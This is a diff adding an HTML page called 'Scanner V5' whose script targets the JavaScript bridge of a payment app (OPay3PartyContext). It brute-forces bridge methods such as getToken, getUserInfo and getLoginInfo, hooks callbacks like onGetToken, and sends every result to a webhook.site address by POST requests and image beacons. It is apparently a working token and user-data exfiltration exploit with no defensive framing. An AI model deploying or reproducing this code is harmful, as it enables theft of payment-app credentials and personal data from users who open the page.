@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner V5</title>
+</head>
+
+<body
+    style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
+    <h1 id="status">SCANNER V5 ACTIVE</h1>
+    <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>
+
+    <script>
+        (function () {
+            var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
+            var logDiv = document.getElementById('log');
+
+            function report(msg, type) {
+                var div = document.createElement('div');
+                div.innerText = msg;
+                logDiv.appendChild(div);
+                new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&v=5&ts=' + Date.now();
+            }
+
+            function exfil(obj) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK, true);
+                xhr.send(JSON.stringify(obj));
+                status.innerText = 'DATA CAPTURED';
+            }
+
+            report('SCANNER V5 START');
+
+            // 1. Massive global property capture
+            setTimeout(function () {
+                report('Bruteforce scan starting...');
+
+                // Inspect OPay3PartyContext deeply
+                if (window.OPay3PartyContext) {
+                    report('OPay3PartyContext detected');
+                    var items = [];
+                    for (var x in window.OPay3PartyContext) { items.push(x); }
+                    report('Keys: ' + items.join(', '));
+
+                    // Brute force method calls
+                    var methods = ['getBaseInfo', 'getToken', 'getUserInfo', 'getLoginInfo', 'getDeviceToken', 'send', 'call', 'jsToNative'];
+                    methods.forEach(function (m) {
+                        try {
+                            if (typeof window.OPay3PartyContext[m] === 'function') {
+                                report('Calling method: ' + m);
+                                var res = window.OPay3PartyContext[m]({});
+                                exfil({ method: m, data: res });
+                            }
+                        } catch (e) { report('Err ' + m + ': ' + e.message); }
+                    });
+                } else {
+                    report('OPay3PartyContext NOT FOUND in window');
+                }
+
+                // Check opayCallback
+                if (window.opayCallback) {
+                    report('opayCallback exists: ' + typeof window.opayCallback);
+                }
+
+                report('Scan cycle V5 complete');
+            }, 2000);
+
+            // Register callbacks
+            ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage'].forEach(function (n) {
+                window[n] = function (d) {
+                    report('CALLBACK: ' + n, 'success');
+                    exfil({ source: 'callback', name: n, data: d });
+                };
+            });
+        })();
+    </script>
+</body>
+
+</html>
